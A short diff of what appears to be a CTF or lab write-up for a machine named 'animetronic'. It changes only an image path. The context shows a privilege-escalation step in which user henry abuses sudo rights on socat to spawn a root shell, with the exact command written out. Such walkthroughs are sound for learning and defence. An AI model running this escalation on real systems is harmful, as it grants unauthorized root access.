@@ -407,7 +407,7 @@ User henry may run the following commands on animetronic:
 2. **Root Access via Socat**
 The socat utility is leveraged to spawn a root shell, as documented on GTFOBins.
 
-![alt text](image.png)
+![alt text](machines/up/image.png)
 
 ```bash
 henry@animetronic:~$ sudo -u root socat - exec:/bin/sh,pty,ctty,raw,echo=0
